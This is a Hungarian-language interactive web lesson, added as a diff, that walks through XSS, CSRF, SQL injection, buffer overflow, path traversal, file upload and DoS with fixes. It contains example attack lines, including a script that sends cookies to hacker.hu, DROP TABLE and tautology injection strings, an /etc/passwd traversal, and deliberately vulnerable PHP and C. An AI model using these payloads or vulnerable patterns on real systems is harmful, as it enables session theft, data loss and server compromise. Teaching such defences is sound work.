+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Stack trace soha ne kerüljön ki!</strong> "NullPointerException at UserService.java:142" → a hacker látja a fájlstruktúrádat</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Szerver verzió elrejtése</strong> — Apache/2.4.51 a HTTP headerben? Elrejteni! A hacker keres ismert exploitot</div>
+      </div>
+      <div class="ibox"><strong>Valódi eset:</strong> Egy webszerver HTTP response header-ben visszaküldte: "Server: Apache/2.2.15 (CentOS)". A hacker megkereste a CVE adatbázisban az Apache 2.2.15 ismert sebezhetőségeit — és azonnal alkalmazta a megfelelő exploitot.</div>
+    `
+  },
+
+  // ── 7. XSS ──────────────────────────────────────────────────────
+  {
+    topic:3, sev:[2],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(245,158,11,0.5)">💉</div>
+        <div><div class="stitle">Cross-Site Scripting (XSS)</div>
+        <div class="ssub">// kliensoldali kód futtatása — az Alkotmánybíróság esete</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(245,158,11,0.1);color:var(--med);border-color:rgba(245,158,11,0.3)">⚠️ 3. SZINT — KÖZEPES HATÁSÚ</div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">PHP — ROSSZ kód (input validáció nélkül)</div></div>
+        <span class="c-cmt">// Mi a baj ezzel?</span>
+        <br><span class="c-kw">&lt;?php</span>
+        <br><span class="c-kw">if</span> (<span class="c-fn">isset</span>(<span class="c-var">$_POST</span>[<span class="c-str">"vnev"</span>])) {
+        <br>&nbsp;&nbsp;<span class="c-fn">print</span>(<span class="c-str">"Üdvözlöm "</span> . <span class="c-bad">$_POST["vnev"]</span> . <span class="c-str">"!"</span>);
+        <br>}
+        <br><span class="c-kw">?&gt;</span>
+        <br><br><span class="c-cmt">// Ha valaki ezt írja a névmezőbe:</span>
+        <br><span class="c-bad">&lt;script&gt;document.location='http://hacker.hu/?c='+document.cookie&lt;/script&gt;</span>
+      </div>
+      <div class="attack-flow">
+        <div class="af-title">// Támadás menete — Alkotmánybíróság eset</div>
+        <div class="af-step"><div class="af-num">1.</div><div>A hacker keres egy oldalt ahol a felhasználói input visszakerül a HTML-be ellenőrzés nélkül</div></div>
+        <div class="af-step"><div class="af-num">2.</div><div>Beír egy &lt;script&gt; taget — ez bekerül az oldal HTML-jébe</div></div>
+        <div class="af-step"><div class="af-num">3.</div><div>Minden látogató böngészője LEFUTTATJA a hacker kódját — cookie lopás, tartalom módosítás</div></div>
+        <div class="af-step"><div class="af-num">4.</div><div>Az Alkotmánybíróság weboldalán így módosították az alaptörvény szövegét — a látogatók hamis tartalmat láttak</div></div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ HELYES: input validáció + output encoding</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> PHP: <code style="font-family:Inconsolata,monospace;font-size:0.68rem;background:rgba(16,185,129,0.1);padding:0 3px">htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</code> — a &lt; és &gt; HTML entitássá válik</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> Content Security Policy (CSP) header — megakadályozza külső script betöltését</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> HttpOnly cookie flag — JS nem tudja olvasni a session cookie-t</div>
+      </div>
+    `
+  },
+
+  // ── 8. CSRF ─────────────────────────────────────────────────────
+  {
+    topic:3, sev:[2],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(245,158,11,0.5)">🔄</div>
+        <div><div class="stitle">Cross-Site Request Forgery (CSRF)</div>
+        <div class="ssub">// az áldozat saját session-jával hajt végre műveleteket</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(245,158,11,0.1);color:var(--med);border-color:rgba(245,158,11,0.3)">⚠️ 3. SZINT — KÖZEPES HATÁSÚ</div>
+      <div class="chat">
+        <div class="msg show">
+          <div class="av">👨‍🏫</div>
+          <div class="bub l"><div class="who" style="color:var(--med)">Oktató</div>
+            A CSRF a legravaszabb támadás. A hacker NEM tör be — az ÁLDOZAT hajtja végre a műveletet a saját nevében, anélkül hogy tudna róla.
+          </div>
+        </div>
+      </div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">URL — CSRF támadás banknál</div></div>
+        <span class="c-cmt">// Eredeti URL (legit banki átutalás Bob-nak):</span>
+        <br><span class="c-str">http://bank.com/transfer?acct=<span class="c-good">BOB</span>&amp;amount=100</span>
+        <br><br><span class="c-cmt">// Hacker megváltoztatja és ELKÜLDI az áldozatnak emailben/SMS-ben:</span>
+        <br><span class="c-bad">http://bank.com/transfer?acct=HACKER&amp;amount=100000</span>
+        <br><br><span class="c-cmt">// Ha az áldozat be van jelentkezve a bankba (aktív session)...</span>
+        <br><span class="c-cmt">// ...és rákattint erre a linkre — az átutalás VÉGREHAJTÓDIK!</span>
+      </div>
+      <div class="attack-flow">
+        <div class="af-title">// Miért működik?</div>
+        <div class="af-step"><div class="af-num">1.</div><div>Anna be van jelentkezve a bankjába — aktív session cookie-ja van a böngészőjében</div></div>
+        <div class="af-step"><div class="af-num">2.</div><div>Kap egy e-mailt: "Nyerd meg az iPhone-t!" — egy linkkel</div></div>
+        <div class="af-step"><div class="af-num">3.</div><div>Rákattint — a böngészője automatikusan elküldi a session cookie-t a bank szerverének</div></div>
+        <div class="af-step"><div class="af-num">4.</div><div>A bank szerver nem tudja megkülönböztetni Anna valódi kérését a hamisítottól → pénz elment</div></div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ HELYES védekezés</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>CSRF token:</strong> minden form-ban egy egyedi, titkos token — a szerver ellenőrzi, hogy a kérés a saját oldaláról jött-e</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>SameSite cookie:</strong> a böngésző csak akkor küldi a cookie-t, ha az oldal URL egyezik</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Kritikus műveleteknél jelszó újra megkérése</strong> — átutalás előtt "Írd be a jelszavadat újra"</div>
+      </div>
+    `
+  },
+
+  // ── 9. SQL INJECTION ────────────────────────────────────────────
+  {
+    topic:4, sev:[3],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(249,115,22,0.5)">🗄️</div>
+        <div><div class="stitle">SQL Injection</div>
+        <div class="ssub">// adatbázis manipulálása felhasználói inputon keresztül</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(249,115,22,0.1);color:var(--high);border-color:rgba(249,115,22,0.3)">🔴 4. SZINT — MAGAS HATÁSÚ</div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">PHP — SÉRÜLÉKENY kód</div></div>
+        <span class="c-var">$result</span> = <span class="c-fn">mysql_query</span>(
+        <br>&nbsp;&nbsp;<span class="c-str">"SELECT * FROM users WHERE email='"</span>
+        <br>&nbsp;&nbsp;. <span class="c-bad">$_GET["email"]</span> .  <span class="c-str">"'"</span>
+        <br>);
+        <br><br><span class="c-cmt">// Ha az email mező értéke ez:</span>
+        <br><span class="c-bad">' OR '1'='1</span>
+        <br><br><span class="c-cmt">// Akkor a lefutó SQL:</span>
+        <br><span class="c-str">SELECT * FROM users WHERE email=<span class="c-bad">'' OR '1'='1'</span></span>
+        <br><span class="c-cmt">// '1'='1' mindig igaz → AZ ÖSSZES USER adata visszajön!</span>
+      </div>
+      <div class="attack-flow">
+        <div class="af-title">// Mit lehet csinálni SQL injectionnel?</div>
+        <div class="af-step"><div class="af-num">📋</div><div><strong>Igaz/hamis lekérdezés:</strong> ' OR '1'='1 → minden rekord visszajön</div></div>
+        <div class="af-step"><div class="af-num">🗑️</div><div><strong>Táblák törlése:</strong> '; DROP TABLE users; -- → adatbázis törölve</div></div>
+        <div class="af-step"><div class="af-num">📤</div><div><strong>Fájl feltöltés:</strong> SQL UNION SELECT INTO OUTFILE → PHP shell feltöltve a szerverre</div></div>
+        <div class="af-step"><div class="af-num">🔑</div><div><strong>Admin belépés jelszó nélkül:</strong> ' OR '1'='1' -- → megkerüli az auth-ot</div></div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ HELYES: Prepared Statements (Paraméteres lekérdezések)</div>
+        <div class="code-block" style="margin:0.3rem 0">
+          <div class="cb-label"><div class="cb-ok">BIZTONSÁGOS PHP PDO</div></div>
+          <span class="c-var">$stmt</span> = <span class="c-var">$pdo</span>-&gt;<span class="c-fn">prepare</span>(<span class="c-str">"SELECT * FROM users WHERE email = ?"</span>);
+          <br><span class="c-var">$stmt</span>-&gt;<span class="c-fn">execute</span>([<span class="c-var">$_GET</span>[<span class="c-str">'email'</span>]]);
+          <br><span class="c-cmt">// Az input SOHA nem kerül bele az SQL szövegbe — csak adat</span>
+        </div>
+      </div>
+    `
+  },
+
+  // ── 10. BUFFER OVERFLOW ─────────────────────────────────────────
+  {
+    topic:5, sev:[0],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(239,68,68,0.5)">💥</div>
+        <div><div class="stitle">Buffer Overflow — Memória korrupció</div>
+        <div class="ssub">// stack felülírása → távoli kódfuttatás</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(239,68,68,0.1);color:var(--crit);border-color:rgba(239,68,68,0.3)">💀 5. SZINT — KRITIKUS</div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">C — SÉRÜLÉKENY kód</div></div>
+        <span class="c-kw">#include</span> <span class="c-str">&lt;string.h&gt;</span>
+        <br><br><span class="c-kw">void</span> <span class="c-fn">func1</span>(<span class="c-kw">char</span>* ar1) {
+        <br>&nbsp;&nbsp;<span class="c-kw">char</span> ar2[<span class="c-num">10</span>];       <span class="c-cmt">// 10 byte-os buffer</span>
+        <br>&nbsp;&nbsp;<span class="c-bad">strcpy</span>(ar2, ar1);  <span class="c-cmt">// NEM ellenőrzi a hosszt!</span>
+        <br>}
+        <br><br><span class="c-kw">int</span> <span class="c-fn">main</span>(<span class="c-kw">int</span> argc, <span class="c-kw">char</span>* argv[]) {
+        <br>&nbsp;&nbsp;<span class="c-fn">func1</span>(argv[<span class="c-num">1</span>]);  <span class="c-cmt">// Ha argv[1] > 10 char → CRASH!</span>
+        <br>&nbsp;&nbsp;<span class="c-kw">return</span> <span class="c-num">0</span>;
+        <br>}
+      </div>
+      <div class="attack-flow">
+        <div class="af-title">// Miért KRITIKUS? — Stack overflow magyarázat</div>
+        <div class="af-step"><div class="af-num">1.</div><div>ar2 = 10 bájt helyet foglal el a stack-en. A stack-en van a visszatérési cím is (RET)</div></div>
+        <div class="af-step"><div class="af-num">2.</div><div>Ha 20 karaktert másolunk bele, az utolsó 10 byte FELÜLÍRJA a visszatérési címet</div></div>
+        <div class="af-step"><div class="af-num">3.</div><div>Hacker pontosan kiszámolja: milyen értékkel írja felül a RET-et, hogy az ő kódjára mutasson</div></div>
+        <div class="af-step"><div class="af-num">4.</div><div>func1() visszatér → de NEM az eredeti hívóhoz, hanem a hacker kódjához → shell nyílik</div></div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ HELYES: Biztonságos függvények + ASLR</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>strcpy helyett strncpy(ar2, ar1, sizeof(ar2)-1)</strong> — megadja a max méretet</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>ASLR (Address Space Layout Randomization)</strong> — a memória elrendezése véletlenszerű minden futtatáskor, nehezebb a RET cím kiszámítása</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>/GS flag</strong> (MSVC) — Stack canary: egy véletlenszerű érték a RET elé, ha megváltozik → crash előtt jelzi a túlcsordulást</div>
+      </div>
+    `
+  },
+
+  // ── 11. PATH TRAVERSAL ──────────────────────────────────────────
+  {
+    topic:6, sev:[2],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(245,158,11,0.5)">📁</div>
+        <div><div class="stitle">Path Traversal (Könyvtár átjárás)</div>
+        <div class="ssub">// "../../../etc/passwd" — a szerver fájlrendszerébe belátni</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(245,158,11,0.1);color:var(--med);border-color:rgba(245,158,11,0.3)">⚠️ 3. SZINT — KÖZEPES HATÁSÚ</div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">PHP — SÉRÜLÉKENY include</div></div>
+        <span class="c-kw">&lt;?php</span>
+        <br><span class="c-fn">include</span>(<span class="c-bad">$_GET["COLOR"]</span>);   <span class="c-cmt">// Input validáció nélkül!</span>
+        <br><span class="c-kw">?&gt;</span>
+        <br><br><span class="c-cmt">// Normál használat:</span>
+        <br><span class="c-str">page.php?COLOR=blue.php</span>
+        <br><br><span class="c-cmt">// Támadó ezt írja be:</span>
+        <br><span class="c-bad">page.php?COLOR=../../../etc/passwd</span>
+        <br><span class="c-cmt">// → A Linux jelszó fájl tartalma megjelenik az oldalon!</span>
+      </div>
+      <div class="attack-flow">
+        <div class="af-title">// Mit lehet elérni path traversal-lal?</div>
+        <div class="af-step"><div class="af-num">📄</div><div>/etc/passwd — Unix felhasználók listája</div></div>
+        <div class="af-step"><div class="af-num">🔑</div><div>config.php — adatbázis jelszavak, API kulcsok</div></div>
+        <div class="af-step"><div class="af-num">📋</div><div>/var/log/apache2/access.log — látja ki mit csinált</div></div>
+        <div class="af-step"><div class="af-num">💉</div><div>Ha PHP include: tetszőleges PHP kódot futtathat a szerveren</div></div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ HELYES védekezés</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Whitelist:</strong> csak előre meghatározott értékeket fogadd el (<code style="font-family:Inconsolata,monospace;font-size:0.68rem">if ($color === 'blue' || $color === 'red')</code>)</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>realpath() + basedir check:</strong> ellenőrizd, hogy az útvonal a megengedett könyvtárban van-e</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Soha ne uses include/require felhasználói inputból</strong></div>
+      </div>
+    `
+  },
+
+  // ── 12. FÁJL FELTÖLTÉS ──────────────────────────────────────────
+  {
+    topic:6, sev:[3],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(249,115,22,0.5)">📤</div>
+        <div><div class="stitle">Fájl Feltöltés — File Upload Attacks</div>
+        <div class="ssub">// kép feltöltőből shell uploader lesz</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(249,115,22,0.1);color:var(--high);border-color:rgba(249,115,22,0.3)">🔴 4. SZINT — MAGAS HATÁSÚ</div>
+      <div class="chat">
+        <div class="msg show">
+          <div class="av">👨‍🏫</div>
+          <div class="bub l"><div class="who" style="color:var(--high)">Oktató</div>
+            Ha egy weboldal fájlfeltöltést enged (pl. profilkép), és nem ellenőrzi mit tölt fel a felhasználó — a hacker egy PHP shellet tölthet fel, ami teljes szerver hozzáférést ad.
+          </div>
+        </div>
+      </div>
+      <div class="cklist">
+        <div class="cli" style="border-left:3px solid var(--crit)">
+          <div class="cli-i">💀</div>
+          <div><strong>tamadokod.php közvetlen feltöltése</strong>
+          <span>Ha nincs ellenőrzés, simán feltölthető egy PHP web shell. Elérve: example.com/uploads/tamadokod.php → teljes szerver hozzáférés.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--crit)">
+          <div class="cli-i">🎭</div>
+          <div><strong>tamadokod.jpg névvel, de PHP tartalommal</strong>
+          <span>A szerver a fájlnevet nézi: .jpg → OK. De a tartalom PHP kód. Ha az Apache rossz config-gal van, lefuttatja a PHP-t a "kép" helyett.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--high)">
+          <div class="cli-i">🔀</div>
+          <div><strong>Kettős kiterjesztés: tamadokod.jpg.php</strong>
+          <span>Egyes szerverek az utolsó kiterjesztést nézi, mások az utolsó pontutánit. Kettős kiterjesztéssel mindkét esetben lefuthat.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--med)">
+          <div class="cli-i">🗄️</div>
+          <div><strong>SQL-lel: INSERT INTO OUTFILE</strong>
+          <span>Ha SQL injection is van a rendszerben, az INTO OUTFILE paranccsal közvetlenül a fájlrendszerbe írhat a támadó.</span></div>
+        </div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ HELYES védekezés</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>MIME type ellenőrzés a tartalomból</strong>, nem csak a névből (getimagesize() képnél)</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Feltöltött fájlokat webgyökéren KÍVÜL tárolni</strong> — nem futtathatók HTTP-n</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Véletlenszerű fájlnév generálás</strong> — a hacker ne tudja az URL-t kitalálni</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Maxméret + típus whitelist</strong> — csak .jpg, .png, max 5MB</div>
+      </div>
+    `
+  },
+
+  // ── 13. MEMÓRIA KORRUPCIÓ EGYÉB ─────────────────────────────────
+  {
+    topic:5, sev:[0],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(239,68,68,0.5)">🧩</div>
+        <div><div class="stitle">Memória korrupció — egyéb formák</div>
+        <div class="ssub">// use-after-free, double free, format string</div></div>
+      </div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">C — Use After Free</div></div>
+        <span class="c-fn">free</span>(a);           <span class="c-cmt">// felszabadítjuk a memóriát</span>
+        <br><span class="c-bad">a-&gt;b = 5;</span>        <span class="c-cmt">// DE még használjuk! → Undefined Behavior</span>
+        <br><br><span class="c-cmt">// C — Double Free</span>
+        <br><span class="c-kw">if</span> (feltétel1) <span class="c-fn">free</span>(a);
+        <br><span class="c-kw">if</span> (feltétel2) <span class="c-bad">free</span>(a);  <span class="c-cmt">// kétszer szabadítjuk fel!</span>
+      </div>
+      <div class="code-block">
+        <div class="cb-label"><div class="cb-lang">C — Format String sérülékenység</div></div>
+        <span class="c-cmt">// ROSSZ:</span>
+        <br><span class="c-bad">printf(userInput);</span>     <span class="c-cmt">// Ha userInput = "%x %x %x"</span>
+        <br><span class="c-cmt">// → kiírja a stack tartalmát!</span>
+        <br><br><span class="c-cmt">// HELYES:</span>
+        <br><span class="c-good">printf("%s", userInput);</span>  <span class="c-cmt">// a %s csak stringként értelmezi</span>
+      </div>
+      <div class="cklist">
+        <div class="cli" style="border-left:3px solid var(--crit)">
+          <div class="cli-i">⚠️</div>
+          <div><strong>Veszélyes függvények C-ben</strong>
+          <span>strcpy, gets, puts, sprintf — hossz ellenőrzés nélküliek. Helyettük: strncpy, fgets, snprintf.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--ok)">
+          <div class="cli-i">🛡️</div>
+          <div><strong>Modern megoldások</strong>
+          <span>Rust language: ownership/borrowing rendszer teszi lehetetlenné a use-after-free és double free hibákat fordítási időben. A Chrome átírja C++ moduljait Rust-ra.</span></div>
+        </div>
+      </div>
+    `
+  },
+
+  // ── 14. DOS ─────────────────────────────────────────────────────
+  {
+    topic:6, sev:[3],
+    render:()=>`
+      <div class="shdr"><div class="sico" style="border-color:rgba(249,115,22,0.5)">💥</div>
+        <div><div class="stitle">Denial of Service (DoS / DDoS)</div>
+        <div class="ssub">// a szerviz elérhetőségének megbénítása</div></div>
+      </div>
+      <div class="sev-badge" style="background:rgba(249,115,22,0.1);color:var(--high);border-color:rgba(249,115,22,0.3)">🔴 4. SZINT — MAGAS HATÁSÚ</div>
+      <div class="cklist">
+        <div class="cli" style="border-left:3px solid var(--crit)">
+          <div class="cli-i">🌊</div>
+          <div><strong>DDoS — Distributed Denial of Service</strong>
+          <span>Millió botnet gép egyszerre küld kérést. 2016: Dyn DNS DDoS — leállt a Twitter, Netflix, Reddit, CNN egyszerre. Oka: 100 000+ IoT eszköz (kamerák, routerek) volt kompromittálva.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--high)">
+          <div class="cli-i">🐌</div>
+          <div><strong>Slow DoS — Slowloris</strong>
+          <span>NEM sok kérést küld, hanem LASSÚ kéréseket. Minden HTTP kérést megkezd, de soha nem fejez be — az összes szerver-kapcsolat foglalva marad. Egyetlen gépről is bénítható egy szerver.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--med)">
+          <div class="cli-i">💰</div>
+          <div><strong>Üzleti hatás</strong>
+          <span>Amazon: 1 másodperc leállás = 1 millió dollár bevételkiesés. DDoS üzleti célból is indítható — konkurens ellen, vagy zsaroláshoz ("fizess vagy leállítjuk az oldaladat").</span></div>
+        </div>
+      </div>
+      <div class="fix-box">
+        <div class="fx-title">✅ Védekezés</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Rate limiting</strong> — egy IP max X kérés/másodperc</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>CDN + WAF</strong> — Cloudflare szűri a kártékony forgalmat a szerver elé</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>Auto-scaling</strong> — ha nő a forgalom, több szerver indul automatikusan</div>
+        <div class="fx-item"><span style="color:var(--ok)">✓</span> <strong>CAPTCHA</strong> — bot-oknál megakadályozza az automatikus kérések küldését</div>
+      </div>
+    `
+  },
+
+  // ── 15. ÖSSZEFOGLALÁS ───────────────────────────────────────────
+  {
+    topic:7, sev:[0,1,2,3,4],
+    render:()=>`
+      <div class="shdr"><div class="sico">∑</div>
+        <div><div class="stitle">Összefoglalás — Biztonsági sérülékenységek</div>
+        <div class="ssub">// az input validáció fontossága mindenhol</div></div>
+      </div>
+      <div class="sumgrid">
+        <div class="sbox" style="border-top:2px solid var(--crit)"><span class="ico">💥</span><div class="val">Buffer Overflow</div><div class="lbl">strcpy → strncpy, ASLR, /GS</div></div>
+        <div class="sbox" style="border-top:2px solid var(--high)"><span class="ico">🗄️</span><div class="val">SQL Injection</div><div class="lbl">Prepared Statements</div></div>
+        <div class="sbox" style="border-top:2px solid var(--med)"><span class="ico">💉</span><div class="val">XSS</div><div class="lbl">htmlspecialchars, CSP</div></div>
+        <div class="sbox" style="border-top:2px solid var(--med)"><span class="ico">🔄</span><div class="val">CSRF</div><div class="lbl">CSRF token, SameSite</div></div>
+      </div>
+      <div class="cklist">
+        <div class="cli" style="border-left:3px solid var(--ok)">
+          <div class="cli-i">🥇</div>
+          <div><strong>Minden támadás közös gyökere: INPUT VALIDÁCIÓ HIÁNYA</strong>
+          <span>SQL injection, XSS, Path Traversal, Buffer Overflow — mind az ellenőrizetlen felhasználói inputra vezethető vissza. Az egyetlen kivétel: CSRF és DoS.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--ok)">
+          <div class="cli-i">🔒</div>
+          <div><strong>3 alapszabály</strong>
+          <span>1. Minden inputot validálj 2. A lehető legkevesebb infót add ki (hibaüzenetek) 3. Legkisebb privilégium elve — csak annyi jogot adjunk amennyit muszáj</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--low)">
+          <div class="cli-i">📊</div>
+          <div><strong>Adatbázisok: CERT, CVE, CWE</strong>
+          <span>Ha ismert library-t használsz, kövesd a CVE értesítéseket. Snyk/Dependabot automatikusan jelez ha ismert sérülékenységet találnak a dependency-dben.</span></div>
+        </div>
+        <div class="cli" style="border-left:3px solid var(--crit)">
+          <div class="cli-i">☢️</div>
+          <div><strong>A Stuxnet tanulsága</strong>
+          <span>Szoftverbiztonsági rés ≠ csak adatlopás. Fizikai pusztítás is lehetséges (centrifugák 20%-a megsemmisült). SCADA, ipari rendszerek, orvosi eszközök — mind szoftvert futtatnak.</span></div>
+        </div>
+      </div>
+    `
+  },
+];
+
+function renderBoard(topicIdx, sevIdxs) {
+  document.getElementById('vulnSteps').innerHTML = TOPICS.map((t,i)=>{
+    const on = i === topicIdx, done = i < topicIdx;
+    const c = on ? t.color : done ? t.color : 'var(--muted)';
+    return `<div class="vs-item ${on?'active':done?'done':''}">
+      <div class="vs-dot" style="border-color:${c};color:${c}">${t.icon}</div>
+      <div class="vs-label" style="color:${on?t.color:'var(--muted)'}">${t.label.replace('\n','<br>')}</div>
+    </div>`;
+  }).join('');
+  document.getElementById('sevChips').innerHTML = SEV_CHIPS.map((s,i)=>{
+    const on = sevIdxs.includes(i);
+    return `<div class="sev-chip ${on?'on':''}" style="border-color:${s.color};color:${s.color}">${s.label}</div>`;
+  }).join('');
+}
+
+let cur = 0;
+function render() {
+  const s = STEPS[cur];
+  renderBoard(s.topic, s.sev);
+  const el = document.getElementById('content');
+  el.innerHTML = s.render();
+  setTimeout(()=>{el.querySelectorAll('.msg:not(.show)').forEach((m,i)=>setTimeout(()=>m.classList.add('show'),i*160));},60);
+  document.getElementById('bprev').disabled = cur===0;
+  document.getElementById('bnext').textContent = cur===STEPS.length-1?'↺ Újra':'Következő →';
+  document.getElementById('ctr').textContent = `${cur+1} / ${STEPS.length}`;
+}
+function next(){cur=cur===STEPS.length-1?0:cur+1;render();}
+function prev(){if(cur>0){cur--;render();}}
+render();
+</script>
+</body>
+</html>
